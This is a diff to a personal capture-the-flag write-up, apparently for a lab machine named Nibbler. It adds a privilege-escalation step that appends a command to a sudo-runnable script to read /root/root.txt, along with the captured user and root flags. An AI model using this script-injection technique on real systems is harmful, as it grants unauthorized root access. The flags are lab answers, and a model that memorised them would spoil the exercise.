@@ -12,7 +12,7 @@
 **Time :** 
 	**Start :** 21.04.2025 / 18:13
 	**Break at/to :** 
-	**Finish :** 
+	**Finish :** 21.04.2025 / 19:30
 **Satisfaction :**  
 ### 1. **Reconnaissance
 
@@ -172,4 +172,27 @@ personal.zip
 user.txt
 cat /home/nibbler/user.txt           
 52e5f38017a66a6418f66d0036540450
+```
+
+So after extracting the zip file into the /home/nibbler/ and enter this command into the script :
+
+```BASH
+echo -e "\n# Injection pour lister /root\ncat /root/root.txt\n" >> /home/nibbler/personal/stuff/monitor.sh
+```
+
+and execut the script with sudo. We have this output :
+
+```BASH
+sudo /home/nibbler/personal/stuff/monitor.sh
+total 32
+drwx------  4 root root 4096 Apr 21 12:02 .
+drwxr-xr-x 23 root root 4096 Dec 15  2020 ..
+-rw-------  1 root root    0 Dec 29  2017 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Dec 10  2017 .cache
+drwxr-xr-x  2 root root 4096 Dec 10  2017 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-------  1 root root 1091 Dec 15  2020 .viminfo
+-r--------  1 root root   33 Apr 21 12:02 root.txt
+b5efc41bc1be517b666fdc6c15890208
 ```
